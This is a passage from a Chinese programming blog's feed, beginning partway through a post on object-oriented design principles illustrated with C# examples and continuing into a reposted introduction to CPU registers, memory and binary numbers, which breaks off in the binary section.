class="keyword">return</span> <span class="number">10000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">.1</span>M;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ManagerEmployee</span> : <span class="title">Employee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ManagerEmployee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name</span>) : <span class="title">base</span>(<span class="params">id, name</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">decimal</span> <span class="title">GetSalary</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">decimal</span> <span class="title">Bonus</span>(<span class="params"><span class="keyword">decimal</span> salary</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> salary * <span class="number">.1</span>M;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TempEmployee</span> : <span class="title">IEmployee</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Employee_ID &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TempEmployee</span>(<span class="params"><span class="keyword">int</span> id, <span class="keyword">string</span> name</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.Employee_ID = id;</span><br><span class="line">        <span class="keyword">this</span>.Name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">decimal</span> <span class="title">GetSalary</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">5000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Employee emp = <span class="keyword">new</span> GeneralEmployee(<span class="number">101</span>, <span class="string">"WangPlus"</span>);</span><br><span class="line">        Employee emp1 = <span class="keyword">new</span> ManagerEmployee(<span class="number">102</span>, <span class="string">"WangPlus1"</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">"Employee ID: &#123;0&#125; Name: &#123;1&#125; Salary: &#123;2&#125; Bonus:&#123;3&#125;"</span>, emp.Employee_ID, emp.Name, emp.GetSalary(), emp.Bonus(emp.GetSalary()));</span><br><span class="line">        Console.WriteLine(<span class="string">"Employee ID: &#123;0&#125; Name: &#123;1&#125; Salary: &#123;2&#125; Bonus:&#123;3&#125;"</span>, emp1.Employee_ID, emp1.Name, emp1.GetSalary(), emp1.Bonus(emp1.GetSalary()));</span><br><span class="line"></span><br><span class="line">        List&lt;IEmployee&gt; emp_list = <span class="keyword">new</span> List&lt;IEmployee&gt;();</span><br><span class="line">        emp_list.Add(<span class="keyword">new</span> GeneralEmployee(<span class="number">101</span>, <span class="string">"WangPlus"</span>));</span><br><span class="line">        emp_list.Add(<span class="keyword">new</span> ManagerEmployee(<span class="number">102</span>, <span class="string">"WangPlus1"</span>));</span><br><span class="line">        emp_list.Add(<span class="keyword">new</span> TempEmployee(<span class="number">103</span>, <span class="string">"WangPlus2"</span>));</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> emp_list)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"Employee ID: &#123;0&#125; Name: &#123;1&#125; Salary: &#123;2&#125; "</span>, obj.EmpId, obj.Name, obj.GetSalary());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、接口隔离原则"><a href="#四、接口隔离原则" class="headerlink" title="四、接口隔离原则"></a>四、接口隔离原则</h1><p>接口隔离原则要求客户不依赖于它不使用的接口和方法；一个类对另一个类的依赖应该建立在最小的接口上。</p>
<p>通常的做法，是把一个臃肿的接口拆分成多个更小的接口，以保证客户只需要知道与它相关的方法。</p>
<p>这个部分不做代码演示了，可以去看看上边单一责任原则里的代码，也遵循了这个原则。</p>
<h1 id="五、依赖倒置原则"><a href="#五、依赖倒置原则" class="headerlink" title="五、依赖倒置原则"></a>五、依赖倒置原则</h1><p>依赖倒置原则要求高层模块不能依赖于低层模块，而是两者都依赖于抽象。另外，抽象不应该依赖于细节，而细节应该依赖于抽象。</p>
<p>看代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Message</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SendMessage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">"Message Sent"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Notification</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> Message _msg;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Notification</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _msg = <span class="keyword">new</span> Message();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PromotionalNotification</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _msg.SendMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Notification notify = <span class="keyword">new</span> Notification();</span><br><span class="line">        notify.PromotionalNotification();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码中，通知完全依赖<code>Message</code>类，而<code>Message</code>类只能发送一种通知。如果我们需要引入别的类型，例如邮件和SMS，则需要修改<code>Message</code>类。</p>
<p>下面，我们使用依赖倒置原则来完成这段代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IMessage</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SendMessage</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Email</span> : <span class="title">IMessage</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SendMessage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">"Send Email"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SMS</span> : <span class="title">IMessage</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SendMessage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">"Send Sms"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Notification</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> IMessage _msg;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Notification</span>(<span class="params">IMessage msg</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>._msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Notify</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _msg.SendMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Email email = <span class="keyword">new</span> Email();</span><br><span class="line">        Notification notify = <span class="keyword">new</span> Notification(email);</span><br><span class="line">        notify.Notify();</span><br><span class="line"></span><br><span class="line">        SMS sms = <span class="keyword">new</span> SMS();</span><br><span class="line">        notify = <span class="keyword">new</span> Notification(sms);</span><br><span class="line">        notify.Notify();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这种方式，我们把代码之间的耦合降到了最小。</p>
<h1 id="六、迪米特法则"><a href="#六、迪米特法则" class="headerlink" title="六、迪米特法则"></a>六、迪米特法则</h1><p>迪米特法则也叫最少知道法则。从称呼就可以知道，意思是：一个对象应该对其它对象有最少的了解。</p>
<p>在写代码的时候，尽可能少暴露自己的接口或方法。写类的时候，能不public就不public，所有暴露的属性、接口、方法，都是不得不暴露的，这样能确保其它类对这个类有最小的了解。</p>
<p>这个原则没什么需要多讲的，调用者只需要知道被调用者公开的方法就好了，至于它内部是怎么实现的或是有其他别的方法，调用者并不关心，调用者只关心它需要用的。反而，如果被调用者暴露太多不需要暴露的属性或方法，那么就可能导致调用者滥用其中的方法，或是引起一些其他不必要的麻烦。</p>
<p>&emsp;  </p>
<p>最后说两句：所谓原则，不是规则，不是硬性的规定。在代码中，能灵活应用就好，不需要非拘泥于形式，但是，用好了，会让代码写得很顺手，很漂亮。</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[计算机底层知识]]></title>
      <url>/2020/01/20/BasicKnowledgeOfComputer/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/cxuanBlog/p/12195745.html" target="_blank" rel="noopener">https://www.cnblogs.com/cxuanBlog/p/12195745.html</a></p>
</blockquote>
<a id="more"></a>

<p>我们每个程序员或许都有一个梦，那就是成为大牛，我们或许都沉浸在各种框架中，以为框架就是一切，以为应用层才是最重要的，你错了。在当今计算机行业中，会应用是基本素质，如果你懂其原理才能让你在行业中走的更远，而计算机基础知识又是重中之重。下面，跟随我的脚步，为你介绍一下计算机底层知识。</p>
<h1 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h1><p>还不了解 CPU 吗？现在就带你了解一下 CPU 是什么。<br>CPU 的全称是 Central Processing Unit，它是你的电脑中最硬核的组件，这种说法一点不为过。CPU 是能够让你的计算机叫计算机的核心组件，但是它却不能代表你的电脑，CPU 与计算机的关系就相当于大脑和人的关系。CPU 的核心是从程序或应用程序获取指令并执行计算。此过程可以分为三个关键阶段：<strong>提取</strong>，<strong>解码</strong>和<strong>执行</strong>。CPU 从系统的主存中提取指令，然后解码该指令的实际内容，然后再由 CPU 的相关部分执行该指令。</p>
<h2 id="CPU-内部处理过程"><a href="#CPU-内部处理过程" class="headerlink" title="CPU 内部处理过程"></a>CPU 内部处理过程</h2><p>下图展示了一般程序的运行流程（以 C 语言为例），可以说了解程序的运行流程是掌握程序运行机制的基础和前提。</p>
<figure class="image-box">
                <img src="1.png" alt title class>
                <p></p>
            </figure>

<p>在这个流程中，CPU 负责的就是解释和运行最终转换成机器语言的内容。</p>
<p>CPU 主要由两部分构成：<strong>控制单元</strong> 和 <strong>算术逻辑单元</strong>（ALU）：</p>
<ul>
<li>控制单元：从内存中提取指令并解码执行</li>
<li>算数逻辑单元（ALU）：处理算数和逻辑运算</li>
</ul>
<p>CPU 是计算机的心脏和大脑，它和内存都是由许多晶体管组成的电子部件。它接收数据输入，执行指令并处理信息。它与输入/输出（I/O）设备进行通信，这些设备向 CPU 发送数据和从 CPU 接收数据。</p>
<p>从功能来看，CPU 的内部由<strong>寄存器</strong>、<strong>控制器</strong>、<strong>运算器</strong>和<strong>时钟</strong>四部分组成，各部分之间通过电信号连通。</p>
<figure class="image-box">
                <img src="2.png" alt title class>
                <p></p>
            </figure>

<ul>
<li>寄存器：是中央处理器内的组成部分。它们可以用来暂存指令、数据和地址。可以将其看作是内存的一种。根据种类的不同，一个 CPU 内部会有 20 - 100 个寄存器。</li>
<li>控制器：负责把内存上的指令、数据读入寄存器，并根据指令的结果控制计算机</li>
<li>运算器：负责运算从内存中读入寄存器的数据</li>
<li>时钟：负责发出 CPU 开始计时的时钟信号</li>
</ul>
<h2 id="CPU-是一系列寄存器的集合体"><a href="#CPU-是一系列寄存器的集合体" class="headerlink" title="CPU 是一系列寄存器的集合体"></a>CPU 是一系列寄存器的集合体</h2><p>在 CPU 的四个结构中，我们程序员只需要了解寄存器就可以了，其余三个不用过多关注，为什么这么说？因为程序是把寄存器作为对象来描述的。</p>
<p>不同类型的 CPU，其内部寄存器的种类，数量以及寄存器存储的数值范围都是不同的。不过，根据功能的不同，可以将寄存器划分为下面这几类：</p>
<table>
<thead>
<tr>
<th>种类</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>累加寄存器</td>
<td>存储运行的数据和运算后的数据。</td>
</tr>
<tr>
<td>标志寄存器</td>
<td>用于反应处理器的状态和运算结果的某些特征以及控制指令的执行。</td>
</tr>
<tr>
<td>程序计数器</td>
<td>程序计数器是用于存放下一条指令所在单元的地址的地方。</td>
</tr>
<tr>
<td>基址寄存器</td>
<td>存储数据内存的起始位置</td>
</tr>
<tr>
<td>变址寄存器</td>
<td>存储基址寄存器的相对地址</td>
</tr>
<tr>
<td>通用寄存器</td>
<td>存储任意数据</td>
</tr>
<tr>
<td>指令寄存器</td>
<td>储存正在被运行的指令，CPU 内部使用，程序员无法对该寄存器进行读写</td>
</tr>
<tr>
<td>栈寄存器</td>
<td>存储栈区域的起始位置</td>
</tr>
</tbody></table>
<p>其中<strong>程序计数器</strong>、<strong>累加寄存器</strong>、<strong>标志寄存器</strong>、<strong>指令寄存器</strong>和<strong>栈寄存器</strong>都<strong>只有一个</strong>，其他寄存器一般有多个。</p>
<figure class="image-box">
                <img src="3.png" alt title class>
                <p></p>
            </figure>

<p>下面就对各个寄存器进行说明。</p>
<h3 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h3><p>程序计数器（Program Counter）是用来存储下一条指令所在单元的地址。<br>程序执行时，PC 的初值为程序第一条指令的地址，在顺序执行程序时，<strong>控制器</strong>首先按程序计数器所指出的指令地址从内存中取出一条指令，然后分析和执行该指令，同时将 PC 的值加 1 指向下一条要执行的指令。</p>
<p>我们还是以一个事例为准来详细的看一下程序计数器的执行过程：</p>
<figure class="image-box">
                <img src="4.png" alt title class>
                <p></p>
            </figure>

<p>这是一段进行相加的操作，程序启动，在经过编译解析后会由操作系统把硬盘中的程序复制到内存中，示例中的程序是将 123 和 456 执行相加操作，并将结果输出到显示器上。<br>地址 0100 是程序运行的起始位置。Windows 等操作系统把程序从硬盘复制到内存后，会将程序计数器作为设定为起始位置 0100，然后执行程序，每执行一条指令后，程序计数器的数值会增加 1（或者直接指向下一条指令的地址），然后，CPU 就会根据程序计数器的数值，从内存中读取命令并执行，也就是说，<strong>程序计数器控制着程序的流程</strong>。</p>
<h3 id="条件分支和循环机制"><a href="#条件分支和循环机制" class="headerlink" title="条件分支和循环机制"></a>条件分支和循环机制</h3><p>高级语言中的条件控制流程主要分为三种：<strong>顺序执行</strong>、<strong>条件分支</strong>、<strong>循环判断</strong>三种，顺序执行是按照地址的内容顺序的执行指令。条件分支是根据条件执行任意地址的指令。循环是重复执行同一地址的指令。</p>
<ul>
<li>顺序执行的情况比较简单，每执行一条指令程序计数器的值就是 + 1。</li>
<li>条件和循环分支会使程序计数器的值指向任意的地址，这样一来，程序便可以返回到上一个地址来重复执行同一个指令，或者跳转到任意指令。</li>
</ul>
<p>下面以条件分支为例来说明程序的执行过程（循环也很相似）：</p>
<figure class="image-box">
                <img src="5.png" alt title class>
                <p></p>
            </figure>

<p>程序的开始过程和顺序流程是一样的，CPU 从 0100 处开始执行命令，在 0100 和 0101 都是顺序执行，PC 的值顺序 +1，执行到 0102 地址的指令时，判断 0106 寄存器的数值大于 0，跳转（jump）到 0104 地址的指令，将数值输出到显示器中，然后结束程序，0103 的指令被跳过了，这就和我们程序中的 if() 判断是一样的，在不满足条件的情况下，指令会直接跳过。所以 PC 的执行过程也就没有直接 +1，而是下一条指令的地址。</p>
<h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><p>条件和循环分支会使用到 jump（跳转指令），会根据当前的指令来判断是否跳转，上面我们提到了标志寄存器，无论当前累加寄存器的运算结果是正数、负数还是零，标志寄存器都会将其保存。<br>CPU 在进行运算时，标志寄存器的数值会根据当前运算的结果自动设定，运算结果的正、负和零三种状态由标志寄存器的三个位表示。标志寄存器的第一个字节位、第二个字节位、第三个字节位各自的结果都为 1 时，分别代表着正数、零和负数。</p>
<figure class="image-box">
                <img src="6.png" alt title class>
                <p></p>
            </figure>

<p>CPU 的执行机制比较有意思，假设累加寄存器中存储的 XXX 和通用寄存器中存储的 YYY 做比较，执行比较的背后，CPU 的运算机制就会做减法运算。而无论减法运算的结果是正数、零还是负数，都会保存到标志寄存器中。结果为正表示 XXX 比 YYY 大，结果为零表示 XXX 和 YYY 相等，结果为负表示 XXX 比 YYY 小。<strong>程序比较的指令，实际上是在 CPU 内部做减法运算</strong>。</p>
<h3 id="函数调用机制"><a href="#函数调用机制" class="headerlink" title="函数调用机制"></a>函数调用机制</h3><p>接下来，我们继续介绍函数调用机制，哪怕是高级语言编写的程序，函数调用处理也是通过把程序计数器的值设定成函数的存储地址来实现的。函数执行跳转指令后，必须进行返回处理，单纯的指令跳转没有意义。</p>
<p>下面是一个实现函数跳转的例子：</p>
<figure class="image-box">
                <img src="7.png" alt title class>
                <p></p>
            </figure>

<p>图中将变量 a 和 b 分别赋值为 123 和 456 ，调用<code>MyFun(a,b)</code>方法，进行指令跳转。图中的地址是将 C 语言编译成机器语言后运行时的地址，由于 1 行 C 程序在编译后通常会变为多行机器语言，所以图中的地址是分散的。在执行完<code>MyFun(a,b)</code>指令后，程序会返回到<code>MyFun(a,b)</code>的下一条指令，CPU 继续执行下面的指令。</p>
<p>函数的调用和返回很重要的两个指令是 call 和 return 指令，再将函数的入口地址设定到程序计数器之前，call 指令会把调用函数后要执行的指令地址存储在名为栈的主存内。函数处理完毕后，再通过函数的出口来执行 return 指令。return 指令的功能是把保存在栈中的地址设定到程序计数器。MyFun 函数在被调用之前，0154 地址保存在栈中，MyFun 函数处理完成后，会把 0154 的地址保存在程序计数器中。这个调用过程如下：</p>
<figure class="image-box">
                <img src="8.png" alt title class>
                <p></p>
            </figure>

<p>在一些高级语言的条件或者循环语句中，函数调用的处理会转换成 call 指令，函数结束后的处理则会转换成 return 指令。</p>
<h3 id="通过地址和索引实现数组"><a href="#通过地址和索引实现数组" class="headerlink" title="通过地址和索引实现数组"></a>通过地址和索引实现数组</h3><p>接下来我们看一下基址寄存器和变址寄存器，通过这两个寄存器，我们可以对主存上的特定区域进行划分，来实现类似数组的操作，首先，我们用十六进制数将计算机内存上的 00000000 - FFFFFFFF 的地址划分出来。那么，凡是该范围的内存地址，只要有一个 32 位的寄存器，便可查看全部地址。但如果想要想数组那样分割特定的内存区域以达到连续查看的目的的话，使用两个寄存器会更加方便。</p>
<p>例如，我们用两个寄存器（基址寄存器和变址寄存器）来表示内存的值：</p>
<figure class="image-box">
                <img src="9.png" alt title class>
                <p></p>
            </figure>

<p>这种表示方式很类似数组的构造，数组是指同样长度的数据在内存中进行连续排列的数据构造。用数组名表示数组全部的值，通过索引来区分数组的各个数据元素，例如：<code>a[0] - a[4]</code>，<code>[]</code>内的 0 - 4 就是数组的下标。</p>
<h2 id="CPU-指令执行过程"><a href="#CPU-指令执行过程" class="headerlink" title="CPU 指令执行过程"></a>CPU 指令执行过程</h2><p>几乎所有的冯·诺伊曼型计算机的 CPU，其工作都可以分为 5 个阶段：<strong>取指令</strong>、<strong>指令译码</strong>、<strong>执行指令</strong>、<strong>访存取数</strong>、<strong>结果写回</strong>。</p>
<ul>
<li>取指令阶段，是将内存中的指令读取到 CPU 中寄存器的过程，程序寄存器用于存储下一条指令所在的地址；</li>
<li>指令译码阶段，在取指令完成后，立马进入指令译码阶段，在指令译码阶段，指令译码器按照预定的指令格式，对取回的指令进行拆分和解释，识别区分出不同的指令类别以及各种获取操作数的方法；</li>
<li>执行指令阶段，译码完成后，就需要执行这一条指令了，此阶段的任务是完成指令所规定的各种操作，具体实现指令的功能；</li>
<li>访问取数阶段，根据指令的需要，有可能需要从内存中提取数据，此阶段的任务是：根据指令地址码，得到操作数在主存中的地址，并从主存中读取该操作数用于运算；</li>
<li>结果写回阶段，作为最后一个阶段，结果写回（Write Back，WB）阶段把执行指令阶段的运行结果数据“写回”到某种存储形式：结果数据经常被写到 CPU 的内部寄存器中，以便被后续的指令快速地存取。</li>
</ul>
<hr>
<h1 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h1><p>CPU 和 内存 就像是一堆不可分割的恋人一样，是无法拆散的一对儿，没有内存，CPU 无法执行程序指令，那么计算机也就失去了意义；只有内存，无法执行指令，那么计算机照样无法运行。</p>
<p>那么什么是内存呢？内存和 CPU 如何进行交互？下面就来介绍一下。</p>
<h2 id="什么是内存"><a href="#什么是内存" class="headerlink" title="什么是内存"></a>什么是内存</h2><p>内存（Memory）是计算机中最重要的部件之一，它是程序与 CPU 进行沟通的桥梁。计算机中所有程序的运行都是在内存中进行的，因此内存对计算机的影响非常大，内存又被称为主存，其作用是存放 CPU 中的运算数据，以及与硬盘等外部存储设备交换的数据。只要计算机在运行中，CPU 就会把需要运算的数据调到主存中进行运算，当运算完成后 CPU 再将结果传送出来，主存的运行也决定了计算机的稳定运行。</p>
<h2 id="内存的物理结构"><a href="#内存的物理结构" class="headerlink" title="内存的物理结构"></a>内存的物理结构</h2><p>内存的内部是由各种 IC 电路组成的，它的种类很庞大，但是其主要分为三种存储器：</p>
<ul>
<li>随机存储器（RAM）： 内存中最重要的一种，表示既可以从中读取数据，也可以写入数据。<strong>当机器关闭时，内存中的信息会丢失。</strong></li>
<li>只读存储器（ROM）：ROM 一般只能用于数据的读取，不能写入数据，但是当机器停电时，这些数据<strong>不会丢失</strong>。</li>
<li>高速缓存（Cache）：Cache 也是我们经常见到的，它分为一级缓存（L1 Cache）、二级缓存（L2 Cache）、三级缓存（L3 Cache）这些数据，它位于内存和 CPU 之间，是一个<strong>读写速度比内存更快</strong>的存储器。当 CPU 向内存写入数据时，这些数据也会被写入高速缓存中。当 CPU 需要读取数据时，会直接从高速缓存中直接读取，当然，如需要的数据在 Cache 中没有，CPU 会再去读取内存中的数据。</li>
</ul>
<p>内存 IC 是一个完整的结构，它内部也有电源、地址信号、数据信号、控制信号和用于寻址的 IC 引脚来进行数据的读写。下面是一个虚拟的 IC 引脚示意图：</p>
<figure class="image-box">
                <img src="10.png" alt title class>
                <p></p>
            </figure>

<p>图中 VCC 和 GND 表示电源，A0 - A9 是地址信号的引脚，D0 - D7 表示的是控制信号、RD 和 WR 都是好控制信号，我用不同的颜色进行了区分，将电源连接到 VCC 和 GND 后，就可以对其他引脚传递 0 和 1 的信号，大多数情况下，<strong>+5V 表示 1，0V 表示 0</strong>。<br>我们都知道内存是用来存储数据，那么这个内存 IC 中能存储多少数据呢？D0 - D7 表示的是数据信号，也就是说，一次可以输入输出 8 bit = 1 byte 的数据。A0 - A9 是地址信号共十个，表示可以指定 00000 00000 - 11111 11111 共 2 的 10次方 = 1024 个地址。每个地址都会存放 1 byte 的数据，因此我们可以得出内存 IC 的容量就是 1 KB。</p>
<h2 id="内存的读写过程"><a href="#内存的读写过程" class="headerlink" title="内存的读写过程"></a>内存的读写过程</h2><p>让我们把关注点放在内存 IC 对数据的读写过程上来吧！我们来看一个对内存 IC 进行数据写入和读取的模型：</p>
<figure class="image-box">
                <img src="11.png" alt title class>
                <p></p>
            </figure>

<p>来详细描述一下这个过程，假设我们要向内存 IC 中写入 1byte 的数据的话，它的过程是这样的：</p>
<ul>
<li>首先给 VCC 接通 +5V 的电源，给 GND 接通 0V 的电源，使用 A0 - A9 来指定数据的存储场所，然后再把数据的值输入给 D0 - D7 的数据信号，并把 WR（write）的值置为 1，执行完这些操作后，即可以向内存 IC 写入数据；</li>
<li>读出数据时，只需要通过 A0 - A9 的地址信号指定数据的存储场所，然后再将 RD 的值置为 1 即可；</li>
<li>图中的 RD 和 WR 又被称为控制信号。其中当 WR 和 RD 都为 0 时，无法进行写入和读取操作。</li>
</ul>
<h2 id="内存的现实模型"><a href="#内存的现实模型" class="headerlink" title="内存的现实模型"></a>内存的现实模型</h2><p>为了便于记忆，我们把内存模型映射成为我们现实世界的模型，在现实世界中，内存的模型很想我们生活的楼房。在这个楼房中，1 层可以存储一个字节的数据，楼层号就是地址，下面是内存和楼层整合的模型图：</p>
<figure class="image-box">
                <img src="12.png" alt title class>
                <p></p>
            </figure>

<p>我们知道，程序中的数据不仅只有数值，还有数据类型的概念，从内存上来看，就是占用内存大小（占用楼层数）的意思。即使物理上强制以 1 个字节为单位来逐一读写数据的内存，在程序中，通过指定其数据类型，也能实现以特定字节数为单位来进行读写。</p>
<hr>
<h1 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h1><p>我们都知道，计算机的底层都是使用二进制数据进行数据流传输的，那么为什么会使用二进制表示计算机呢？或者说，什么是二进制数呢？在拓展一步，如何使用二进制进行加减乘除？下面就来看一下。</p>
<h2 id="什么是二进制数"><a href="#什么是二进制数" class="headerlink" title="什么是二进制数"></a>什么是二进制数</h2><p>那么什么是二进制数呢？为了说明这个问题，我们先把 00100111 这个数转换为十进制数看一下，二进制数转换为十进制数，直接将 各位置上的值 * 位权 即可，那么我们将上面的数值进行转换：</p>
<figure class="image-box">
                <img src="13.png" alt title class>
                <p></p>
            </figure>

